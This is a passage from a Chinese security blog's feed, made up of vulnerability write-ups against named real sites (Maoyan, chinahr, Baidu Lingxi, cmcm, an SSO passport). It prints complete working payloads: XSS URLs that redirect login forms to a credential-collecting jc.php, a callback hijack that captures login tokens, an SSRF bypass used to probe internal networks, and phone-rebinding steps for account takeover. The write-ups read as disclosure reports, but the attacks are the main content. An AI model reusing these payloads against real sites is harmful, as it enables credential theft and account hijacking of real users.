class="code"><pre><span class="line">Cookie: </span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure>

<p>注意数据包里的<code>xx.cb</code>，我们将其修改为<code>http://127.0.0.1/jc.php</code></p>
<p>jc.php文件的代码是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 因为是演示，所以单纯只是打印，而不是将其存储至数据库</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;&lt;pre&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( $_GET );</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/5wopy4s1eclm62a7wm3ovljj/1.png" alt="1.png-276.6kB"></p>
<p>修改后的url为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D;</span></pre></td></tr></table></figure>

<p>放包，会来到登陆页面</p>
<p>3、输入正确的密码，并且点击登陆</p>
<p><img src="http://static.zybuluo.com/1kbfree/gmjjr43tg2qjwihva05513ld/1.png" alt="1.png-324.1kB"></p>
<p><em>成功的获取了用户的登陆凭证</em></p>
<p>4、修改为登陆凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tongbu.xxx.com&#x2F;contact&#x2F;contact&#x2F;portal&#x2F;initSession?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.wust&#x3D;ZAgAAAAAAAGE9MTAxMjM5MjQ3MDkmYj0xJmM9NCZkPTEwMTIxJmU9ODcxRUNDMTA4N0M4MzhGNzU1QjhGOUJFRjUxRkQzMDMxJmg9MTUzMTcxMDE4NzUwMCZpPTQzMjAwJmlsPWNuJnVzZXJuYW1lPTE1MTE5MzMwMzc2yFbCIH3Sep4W5Ye4v27TQw&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.lang&#x3D;zh_CN&amp;xx.vp&#x3D;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/e0qelsjueejcerznngtqm74p/1.png" alt="1.png-289.9kB"></p>
<p>成功的访问，那么利用的话是很简单的，只需要将如下url发送给用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D;</span></pre></td></tr></table></figure>
<p>用户打开后，输入账号和密码我们就可以成功的获取用户的登陆凭据（假设<code>127.0.0.1</code>是域名，假设<code>jc.php</code>是将<code>get</code>请求的所有数据保存到数据库了）</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>猫眼头像上传处存在ssrf</title>
    <url>/2018/12/13/%E7%8C%AB%E7%9C%BC%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E5%A4%84%E5%AD%98%E5%9C%A8ssrf/</url>
    <content><![CDATA[<p>1、打开Url：<a href="http://maoyan.com/profile，然后选择一个图片上传然后抓包发现有如下请求" target="_blank" rel="noopener">http://maoyan.com/profile，然后选择一个图片上传然后抓包发现有如下请求</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/zwgxk722e5m8l1cwn9mfwrf6/1.png" alt="1.png-174.4kB"></p>
<p>然后我猜想这里的处理流程是这样的：</p>
<ol>
<li>上传文件后返回包返回一个<code>Url</code></li>
<li>然后上图那个请求把一部的<code>Url</code>去访问并且使其成为图片地址（应该是读取<code>Url</code>然后把它内容写入~）</li>
</ol>
<p>那么以上流程如果<code>Url</code>没有严格过滤的话是会造成<code>SSRF</code>的，然后发现可以用如下绕过~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;p1.meituan.net.xxxxxxxxxxxxxxxx.xxxxxxxxxxxx</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/f6ajurnkn5gdnlhnh5u2xc75/1.png" alt="1.png-147.9kB"></p>
<p>然后去我的<code>CEYE</code>去看下~</p>
<p><img src="http://static.zybuluo.com/1kbfree/x50o3y4jjee741s3hr1p0mfj/1.png" alt="1.png-104.9kB"></p>
<p>可以看到他这里是有去请求的，那么还可以利用<code>CEYE</code>的<code>DNS Rebinding</code>使其去访问一个<code>ip</code>（比较麻烦），所以这里用另一种方法来使其访问随意一个<code>ip</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;p1.meituan.net.183.232.231.172.xip.io&#x2F;</span></pre></td></tr></table></figure>

<p>这里的<code>183.232.231.172</code>是我<code>ping</code>百度的<code>ip</code>，然后我打开一下看看~</p>
<p><img src="http://static.zybuluo.com/1kbfree/lz0psyxavxnf65hxnnclmgv6/1.png" alt="1.png-32.9kB"></p>
<p>然后放入请求中是可以正常访问的，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/5d4iijuapizecd3f6xbqd91o/1.png" alt="1.png-146.6kB"></p>
<p>那么再测试一个无法访问的<code>ip</code>试试</p>
<p><img src="http://static.zybuluo.com/1kbfree/1kr75b76r8emmz4oikazftal/1.png" alt="1.png-170.1kB"></p>
<p>可以看到返回的是<code>504</code>而且请求时间非常的长~ 那么来探测一下内网</p>
<p><img src="http://static.zybuluo.com/1kbfree/x7mlwhiegs1pjnld6nylydiv/1.png" alt="1.png-131.4kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/xllv54uq86g4mj5zkd92ke56/1.png" alt="1.png-110.9kB"></p>
<blockquote>
<p><code>127.0.0.1</code>没开放<br><code>192.168.0.1</code>开放~</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>英才网登陆处设计缺陷可劫持用户登录凭据</title>
    <url>/2018/10/02/%E8%8B%B1%E6%89%8D%E7%BD%91%E7%99%BB%E9%99%86%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/</url>
    <content><![CDATA[<p>1、打开Url：<code>http://passport.chinahr.com/qy/buser/login?backUrl=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/a7obm4m6grfu8lkj9h1g1g1n/1.png" alt="1.png-185kB"></p>
<p>2、构造思路来深入利用</p>
<p>可以看到这里是可以执行<code>js</code>代码的，那么我这里就有一个骚思路了，就是能否把这个表单提交到我们自定义的页面呢，这样子我们就可以获取到用户登录的账号和密码了~</p>
<p>3、构造利用的poc</p>
<p>我们都知道提交表单是用<code>html</code>的<code>form</code>来提交的，那么我们来构造把~<br>，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt;</span></pre></td></tr></table></figure>

<p>其中，<strong>jc.php</strong>页面的代码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;&lt;pre&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( $_POST ); &#x2F;&#x2F;打印出页面提交过来的post数据</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p>4、打开poc链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/t4kjlf51xf0fpfrifn8pnlw7/image_1cjvejuoppqjeod2g3bs91pcu22.png" alt="image_1cjvejuoppqjeod2g3bs91pcu22.png-413.8kB"></p>
<p>这里有一个<code>&quot;&gt;</code>，为了让用户不起疑心我们来把这个闭合了，重新构造的poc如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt;&lt;p id&#x3D;&quot;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/a50mqtyfc869l5u3fo5ndd4a/image_1cjvem3ci1ar4ogpav515b3jkt2f.png" alt="image_1cjvem3ci1ar4ogpav515b3jkt2f.png-437.9kB"></p>
<p>然后随便输入一下，点击提交</p>
<p><img src="http://static.zybuluo.com/1kbfree/j0ontfkswdbqvbg6fhkunz0h/image_1cjveo0op123tkgbq27jok13q839.png" alt="image_1cjveo0op123tkgbq27jok13q839.png-104.5kB"></p>
<p>然后假设我这个<code>jc.php</code>是后台获取的，然后会把每次的<code>post</code>数据保存到数据库，然后再自动跳转到首页。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>英才网某处设计缺陷导致任意用户注册以及任意用户重置以及任意用户登录</title>
    <url>/2018/10/01/%E8%8B%B1%E6%89%8D%E7%BD%91%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%BB%A5%E5%8F%8A%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h3 id="利用fuzz大法导致的任意用户重置-amp-注册"><a href="#利用fuzz大法导致的任意用户重置-amp-注册" class="headerlink" title="利用fuzz大法导致的任意用户重置&amp;注册"></a>利用fuzz大法导致的任意用户重置&amp;注册</h3><p>1、打开Url：<a href="http://mym.chinahr.com/account/" target="_blank" rel="noopener">http://mym.chinahr.com/account/</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/ucv6mvdpmfxv2gp0ri3uvonz/image_1dtd2bf8ujgogl413vj199crnf9.png" alt="image_1dtd2bf8ujgogl413vj199crnf9.png-253.1kB"></p>
<p>点击修改邮箱的时候，会发起一个请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mym.chinahr.com&#x2F;account&#x2F;updateMail?email&#x3D;only_free%40qq.com</span></pre></td></tr></table></figure>

<p>这里我手贱的修改了为如下的Url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mym.chinahr.com&#x2F;account&#x2F;updatePhone?mobile&#x3D;2333333</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/itubql30hb5hrn9tf9c6qyjy/image_1ck7s0pdam5l1ggl10er1oru17ia26.png" alt="image_1ck7s0pdam5l1ggl10er1oru17ia26.png-40.2kB"></p>
<p>果然，傻人有傻福，居然成功了，那么任意用户注册和任意用户重置就简单了</p>
<h4 id="任意用户注册复现步骤"><a href="#任意用户注册复现步骤" class="headerlink" title="任意用户注册复现步骤"></a>任意用户注册复现步骤</h4><p>现在我有2个账号，如下</p>
<table>
<thead>
<tr>
<th align="center">账号A</th>
<th align="center">账号B</th>
</tr>
</thead>
<tbody><tr>
<td align="center">17777777777</td>
<td align="center">18888888888</td>
</tr>
</tbody></table>
<p>首先我登陆用手机号码<code>17777777777</code>然后把手机号码修改为<code>18888888888</code>，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/o1egupkf2vwolqwrcuzavyq7/image_1dtd2cp3hpud1u3e1ruh1f4j1gchm.png" alt="image_1dtd2cp3hpud1u3e1ruh1f4j1gchm.png-261.9kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/vtied52rp2lsl6094z0ayk9r/image_1ck7srmpbkac1kn332l1h4au8u3g.png" alt="image_1ck7srmpbkac1kn332l1h4au8u3g.png-83.2kB"></p>
<p>然后我现在再用<code>17777777777</code>注册一个号然后再把手机号码改成<code>13688888888</code>，那么就可以导致用户注册了，具体步骤如下</p>
<p>登陆A账号修改手机号码为<code>xxxx1</code> -&gt; 然后A账号会变没 -&gt; 然后再用A账号原先绑定的手机号码注册一个用户 -&gt; 再次修改为其他手机号码 -&gt; A账号又变没  ，依次类推就可以任意用户重置了，而这个写脚本也可以实现的（神通广大的审核大大一定知道的我就不多说了）</p>
<h4 id="任意用户重置复现步骤"><a href="#任意用户重置复现步骤" class="headerlink" title="任意用户重置复现步骤"></a>任意用户重置复现步骤</h4><blockquote>
<p>我想重置一<code>18888888888</code>这个手机号码的用户，我思路是这样的，如下：</p>
</blockquote>
<blockquote>
<p>首先我拿手机号为<code>17777777777</code>的那个号把手机号码修改为<code>18888888888</code>(访问<code>http://mym.chinahr.com/account/updatePhone?mobile=18888888888</code>)，然后这个时候<code>17777777777</code>就变成空，然后我再登陆<code>18888888888</code>的账号，把手机号码修改为<code>18888888888</code>，然后<code>18888888888</code>这个账号就不存在了</p>
</blockquote>
<p>1、登陆<code>17777777777</code>，手机号码修改为<code>18888888888</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/ckjgn4peayzjuxhmluocnfac/image_1dtd2dsh3rdi19d19c4e1498113.png" alt="image_1dtd2dsh3rdi19d19c4e1498113.png-428.2kB"></p>
<p>点击<code>Execute</code>会访问这个<code>Url</code>，然后手机号码会成功被修改，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/mvfr900gpnezji6ny59q5l9z/image_1dtd2fifn19be10bk1iu81afq1ov91t.png" alt="image_1dtd2fifn19be10bk1iu81afq1ov91t.png-446.5kB"></p>
<p>2、这个时候再把手机号码修改为<code>1</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/llylekmg3yvfnksoiy741ror/image_1ck7to9tr1haa4up4s51hkr1365n.png" alt="image_1ck7to9tr1haa4up4s51hkr1365n.png-75.2kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/8j4ong81x6lcp70pl5300lgg/image_1ck7tok9u1tb8rbv0lnph1dcu64.png" alt="image_1ck7tok9u1tb8rbv0lnph1dcu64.png-122.4kB"></p>
<p>3、测试一下手机号码是否不存在了</p>
<p><img src="http://static.zybuluo.com/1kbfree/thndzayqom4txph47y2q746j/image_1dtd2gns810bk1l7h1jsoh2jhm72q.png" alt="image_1dtd2gns810bk1l7h1jsoh2jhm72q.png-422.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/4l337imtvt75800l31e3153d/image_1dtd2hdf21memui11k291nbdskh3a.png" alt="image_1dtd2hdf21memui11k291nbdskh3a.png-365.5kB"></p>
<h4 id="任意用户登录复现步骤"><a href="#任意用户登录复现步骤" class="headerlink" title="任意用户登录复现步骤"></a>任意用户登录复现步骤</h4><p>其实这个洞不是直接登陆的，而是有一定的利用过程，如下</p>
<p>假设<code>17777777777</code>是我的攻击目标，并且他这里没有绑定邮箱、微信这些</p>
<p><img src="http://static.zybuluo.com/1kbfree/08eh2q859jj8nszdwywdgtjv/image_1dtd2i1re8kufmf1pn5b0q158v3n.png" alt="image_1dtd2i1re8kufmf1pn5b0q158v3n.png-456.6kB"></p>
<p>然后我通过登陆<code>18888888888</code>后把手机号码修改为<code>17777777777</code>（访问：<a href="http://mym.chinahr.com/account/updatePhone?mobile=17777777777）" target="_blank" rel="noopener">http://mym.chinahr.com/account/updatePhone?mobile=17777777777）</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/t5zxifxddecbp0wwenjs3jk8/image_1dtd2j8081r861uk61k9md4d18kj4k.png" alt="image_1dtd2j8081r861uk61k9md4d18kj4k.png-328.6kB"></p>
<p>ok，然后<code>18888888888</code>的手机号码就变成<code>17777777777</code>那个账号了</p>
<p><img src="http://static.zybuluo.com/1kbfree/h0wns6wel3qwbbnljjvi3t0h/image_1dtd2knao1kr4145b9d217r8fro5e.png" alt="image_1dtd2knao1kr4145b9d217r8fro5e.png-390.8kB"></p>
<p>然后这个时候我们来绑定一下微信和邮箱，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/afqg6j9lx6wjqlqm80i3xe44/image_1dtd2ltrr1ovq1mvg19i51kkl1bhi6e.png" alt="image_1dtd2ltrr1ovq1mvg19i51kkl1bhi6e.png-376.9kB"></p>
<p>然后用户发现登陆密码不对了修改完密码后，我还是可以通过微信或者qq邮箱来登陆&amp;找回他密码，也算一个任意登陆了</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>灵犀登陆处可劫持用户登录凭据</title>
    <url>/2018/09/13/%E7%81%B5%E7%8A%80%E7%99%BB%E9%99%86%E5%A4%84%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/</url>
    <content><![CDATA[<p>1、打开<code>Url</code>：<a href="http://lingxi.baidu.com/login/?fromu=http://lingxi.baidu.com&amp;appid=336&amp;u=http://lingxi.baidu.com/#/" target="_blank" rel="noopener">http://lingxi.baidu.com/login/?fromu=http://lingxi.baidu.com&amp;appid=336&amp;u=http://lingxi.baidu.com/#/</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/k43cromahpmmcd0c9chcg639/image_1clo7glpbrqlbl2t1t1b8adi59.png" alt="image_1clo7glpbrqlbl2t1t1b8adi59.png-327.8kB"></p>
<p>2、登陆后报错页面会跳转到这样的Url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;ç¨æ·åå¯ç éè¯¯&amp;un&#x3D;admin&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F;</span></pre></td></tr></table></figure>

<p>然后将其修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&amp;un&#x3D;admin&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/o4jgzmzbsvxt7i3o4y4x6wqs/image_1clo7jcar17te1d041p0j1agt12t3m.png" alt="image_1clo7jcar17te1d041p0j1agt12t3m.png-270.6kB"></p>
<p>可以看到将其<code>url</code>编码，可以解析<code>html</code>代码，然后我有个想法，看看能不能把登陆的信息提交到我自定义的页面(因为这里有<code>httponly</code>所以无法获取到<code>cookie</code>,所以可以利用这个办法来获取用户的账号和密码来登入用户的账号)。</p>
<p>3、高危化利用，构造为如下<code>Url</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;%3Csvg%2fonload%3D%22var%20form1%20%3D%20document.getElementById%28%27uclogin%27%29%3Bform1.action%20%3D%20%27http%3A%2f%2f127.0.0.1%2fjc.php%27%3B%22%3E&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F;</span></pre></td></tr></table></figure>

<p>然后<code>jc.php</code>的代码是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;&lt;pre&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( $_REQUEST );</span></pre></td></tr></table></figure>

<p>然后我们尝试一下登陆，随便输入内容后然后点击立即登陆</p>
<p><img src="http://static.zybuluo.com/1kbfree/0gekarjvhlducjpdqhhixd4i/image_1clo833dm1m431sk718fv1nlotgf13.png" alt="image_1clo833dm1m431sk718fv1nlotgf13.png-334.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/57ic7qke5xh7izbochzqvm7m/image_1clo86lfem7549789nl2q1ouf1g.png" alt="image_1clo86lfem7549789nl2q1ouf1g.png-122kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>猎豹广告fuzz参数导致任意邮箱绑定</title>
    <url>/2018/08/08/%E7%8C%8E%E8%B1%B9%E5%B9%BF%E5%91%8Afuzz%E5%8F%82%E6%95%B0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E9%82%AE%E7%AE%B1%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<p>1、打开Url：<a href="https://ori.cmcm.com/user/index.html" target="_blank" rel="noopener">https://ori.cmcm.com/user/index.html</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/3pv07a0pb53hmys8j0ioilba/image_1cjpv7jc01c2762q6vm19d3o9.png" alt="image_1cjpv7jc01c2762q6vm19d3o9.png-149kB"></p>
<p>2、点击保存并且抓包，抓取的数据包如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;updateoneruserinfo.html HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: ori.cmcm.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.36</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span></pre></td></tr><tr><td class="code"><pre><span class="line">X-Requested-With: XMLHttpRequest</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;ori.cmcm.com&#x2F;user&#x2F;index.html</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 134</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: 这是一个马赛克</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">skype&#x3D;soory%2Cnull&amp;timezone&#x3D;Asia%2FShanghai&amp;country&#x3D;CN&amp;surname&#x3D;free&amp;name&#x3D;only&amp;cm_token&#x3D;ec622cd7baffb66839d657bd39d563c3211533098840827</span></pre></td></tr></table></figure>

<p>然后来<code>fuzz</code>一下，加上<code>email</code>参数后，数据包如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;updateoneruserinfo.html HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: ori.cmcm.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.36</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span></pre></td></tr><tr><td class="code"><pre><span class="line">X-Requested-With: XMLHttpRequest</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;ori.cmcm.com&#x2F;user&#x2F;index.html</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 134</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: 这是马赛克</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">skype&#x3D;soory%2Cnull&amp;timezone&#x3D;Asia%2FShanghai&amp;country&#x3D;CN&amp;surname&#x3D;free&amp;name&#x3D;only&amp;cm_token&#x3D;ec622cd7baffb66839d657bd39d563c3211533098840827&amp;email&#x3D;only_free@qq.com</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/2f69y9n6vdvnfzp38lct6m0t/image_1cjpvg8lp12co1kjs1hcfve81si9m.png" alt="image_1cjpvg8lp12co1kjs1hcfve81si9m.png-120.6kB"></p>
<p>ok，这里存在任意邮箱绑定，那么我们来绑定一个存在的用户的邮箱来尝试下看看能不能修改存在邮箱的账号</p>
<p>3、注册一个邮箱账号</p>
<p><img src="http://static.zybuluo.com/1kbfree/bfobz1gszlp643ymmvis0mci/image_1cjpvk4r3mo21fk0ejn1ncaguf1j.png" alt="image_1cjpvk4r3mo21fk0ejn1ncaguf1j.png-88kB"></p>
<p>注册好后登陆进去</p>
<p><img src="http://static.zybuluo.com/1kbfree/klehcxhjhdymz0ybwmqwx2yk/image_1cjpvmnoqv7qr1q1hdsv4e13ra20.png" alt="image_1cjpvmnoqv7qr1q1hdsv4e13ra20.png-96.5kB"></p>
<p>4、在<code>2017614104@qq.com</code>的账号处吧邮箱改成<code>1900065568@qq.com</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/dmhsqwf9qmquyfpr57c8q4x5/image_1cjq07p4c1h5u104pjeuj641s0h2t.png" alt="image_1cjq07p4c1h5u104pjeuj641s0h2t.png-140.9kB"></p>
<p>我去，这里有过滤。。</p>
<p>来试试看看能不能绕过</p>
<p><img src="http://static.zybuluo.com/1kbfree/iwfcr2ub83jc6bkk5l0g9i6b/image_1cjq09kd3fdn40h17i91ve8bf93a.png" alt="image_1cjq09kd3fdn40h17i91ve8bf93a.png-162.9kB"></p>
<p>好吧，绕不过，难受了，只能当任意邮箱绑定提交了（泪奔.png）</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>一个有趣的恶作剧</title>
    <url>/2018/07/22/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E6%81%B6%E4%BD%9C%E5%89%A7/</url>
    <content><![CDATA[<p>首先，正常打开I春秋页面（<a href="https://bbs.ichunqiu.com/portal.php）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/portal.php）</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/nwi21qubl7d9nfk5bsgcmo9n/image_1co8pc6j2lsosoc5deimp119l9.png" alt="image_1co8pc6j2lsosoc5deimp119l9.png-488kB"></p>
<p>然后手贱一下加上一个<code>alert(1)</code>试试~（<code>https://bbs.ichunqiu.com/portal.ph    p?a=alert(1)</code>）</p>
